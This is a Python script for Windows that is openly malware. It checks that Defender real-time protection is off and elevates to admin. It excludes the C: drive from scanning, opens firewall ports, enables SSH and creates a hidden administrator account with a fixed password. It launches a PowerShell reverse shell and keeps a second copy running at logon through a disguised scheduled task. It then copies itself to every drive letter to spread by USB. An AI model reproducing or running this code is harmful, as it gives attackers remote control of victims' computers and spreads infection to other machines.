#!/usr/bin/env python3

print("""                                                              6               EEEEEEEEEEE      X     X     EEEEEEEEEEE  
 ||0@#@         .O0O0.       .O0O0.         X         A               5                D                 X   X      D 
 ||    X       0      O     0      O       X  X      Z Q             5   7             D                  X X       D
 ||     @      O      0     O      0      X    F    F   A           5    5             DXXXXXXXXX          X        DFFFFFFFFFF
 ||      @     0      O     0      O     F      B  X     K          567746721          D                  X X       D
 ||      @     O      0     0      0    X       X X       K              8      @@     D                 X   X      D
 ||     O       .O0O0.       .0O0O.    M         X         Z             6      @@     DVVVVVVVVVV      X     X     DXXXXXXXXXX
 ||#@@@"
""")

import os
import sys
from sys import exit
import platform
import subprocess
import subprocess as sub
import ctypes
import shutil
import re
import time
import sysconfig

if os.name != "nt": #_Checks_If_Operating_System_Is_Windows_And_Exits_If_Not
    exit()
    
win_av = subprocess.run('powershell.exe Get-MpComputerStatus',shell=True, capture_output=True).stdout.decode() 
if re.search("RealTimeProtectionEnabled        : True", win_av):
    ctypes.windll.user32.MessageBoxW(0, "Real Time Protection Must Be Disabled For Install", "Error", 1)
    exit()
else:     #_Checks_If_Windows_Anti-Virus_Real_Time_Protection_Is_Enabled_And_Requires_It_To_Be_Off
    print("RealTimeProtectionDisabled_Infecting_With_Virus_Now")
time.sleep(0.5)

def is_usr_admin(): #_Checks_If_Script_Has_Admin_Privs
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("Not_Enuf_Privs_2_Install_Dependencies")
        ctypes.windll.shell32.ShellExecuteW(
            None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
        exit(0)
    else:
        time.sleep(0.5)
is_usr_admin()

current_user = os.getenv('username')
mal_file = "($cript!).exe" #_Name_Of_The_Script_Must_Go_Here_!!!

def shell_commands():
    subprocess.run('powershell.exe Add-MpPreference -ExclusionPath “C:”', shell=True)
    time.sleep(0.5)
    subprocess.run('powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force', shell=True)
    time.sleep(0.5)
    subprocess.run('powershell.exe New-NetFirewallRule -DisplayName "VIRUS" -Direction inbound -Profile Any -Action Allow -LocalPort 80,22 -Protocol TCP', shell=True)
    time.sleep(0.5)
    subprocess.run('powershell.exe New-NetFirewallRule -DisplayName "THISONEDICKHEAD" -Direction outbound -Profile Any -Action Allow -LocalPort 80,22,443 -Protocol TCP', shell=True)
    time.sleep(0.5)
    subprocess.run("powershell.exe Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0", shell=True)
    time.sleep(0.5)
    subprocess.run("powershell.exe Set-Service -Name sshd -StartupType 'Automatic'", shell=True)
    time.sleep(0.5)
    subprocess.run("powershell.exe Start-Service sshd", shell=True)
    time.sleep(0.5)
shell_commands()

def create_new_usr(): #_Adds_A_New_Administrator_To_The_System
    ssh_username = "defaultuser"
    ssh_passwds = "PassW0rd1@"
    command = """
    $nusnm = """ + '"{}"'.format(ssh_username) + """
    $nuspss = ConvertTo-SecureString """ + '"{}"'.format(ssh_passwds) + """ -AsPlainText -Force
    New-LocalUser -Name $nusnm -Password $nuspss
    Add-LocalGroupMember -Group "Administrators" -Member $nusnm
    Get-LocalUser
    """
    print(command)
    exec = sub.Popen(["powershell","& {" + command + "}"], shell=True)
    time.sleep(0.5)
create_new_usr()

try:  #_Reverse_Shell_Attempt
    subprocess.run("powershell.exe New-Object System.Net.Sockets.TCPClient('0.0.0.0',0);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", shell=True)
except:
    print("Reverse_Shell_FAILED")   

def persistence():
    if os.path.exists("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
        print("Nice_Already_Got_Me_A_Seat")
    else:
        os.mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
        time.sleep(0.5)
    shutil.move("" + mal_file + "","C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + "")
    time.sleep(0.5)
    subprocess.run("powershell.exe Register-ScheduledTask -TaskName \"SYSTEM32\" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute \"${Env:WinDir}\System32\WindowsPowerShell\v1.0\powershell.exe\" -Argument \"-WindowStyle Hidden -Command `\"& 'C:\\Users\\$env:USERNAME\\AppData\\Local\\Temp\\tmp_0x234692367923\\windows_update.ps1'`"") -RunLevel Highest -Force;", shell=True)
    time.sleep(1)
    f = open("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\windows_update.ps1", 'w')
    time.sleep(0.5)
    f.write(""""
    $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
    add-type -name win -member $t -namespace native
    [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
    $client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',00);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    """)
    time.sleep(0.5)
    os.system( "attrib +h C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
persistence()

def usb_drop(): #_Copys_File_To_All_Connected_Usb's_To_Spread
    try:
        shutil.copy("" + mal_file + "", "A://" + mal_file + "")
    except:
        print('NO_A_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "B://" + mal_file + "")
    except:
        print('NO_B_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "C://" + mal_file + "")
    except:
        print('NO_C_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "D://" + mal_file + "")
    except:
        print('NO_D_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "E://" + mal_file + "")
    except:
        print('NO_E_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "F://" + mal_file + "")
    except:
        print('NO_F_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "G://" + mal_file + "")
    except:
        print('NO_G_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "H://" + mal_file + "")
    except:
        print('NO_H_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "I://" + mal_file + "")
    except:
        print('NO_I_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "J://" + mal_file + "")
    except:
        print('NO_J_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "K://" + mal_file + "")
    except:
        print('NO_K_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "L://" + mal_file + "")
    except:
        print('NO_L_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "M://" + mal_file + "")
    except:
        print('NO_M_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "N://" + mal_file + "")
    except:
        print('NO_N_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "O://" + mal_file + "")
    except:
        print('NO_O_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "P://" + mal_file + "")
    except:
        print('NO_P_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "Q://" + mal_file + "")
    except:
        print('NO_Q_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "R://" + mal_file + "")
    except:
        print('NO_R_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "S://" + mal_file + "")
    except:
        print('NO_S_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "T://" + mal_file + "")
    except:
        print('NO_T_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "U://" + mal_file + "")
    except:
        print('NO_U_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "V://" + mal_file + "")
    except:
        print('NO_V_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "W://" + mal_file + "")
    except:
        print('NO_W_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "X://" + mal_file + "")
    except:
        print('NO_X_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "Y://" + mal_file + "")
    except:
        print('NO_Y_DRIVE')
        time.sleep(0.5)
    try:
        shutil.copy("" + mal_file + "", "Z://" + mal_file + "")
    except:
        print('NO_Z_DRIVE')
usb_drop()

def self_destruct_and_cleanup():  #_Erases_Mal_File_From_System
    time.sleep(5)
    os.remove(mal_file)
self_destruct_and_cleanup()  
    
    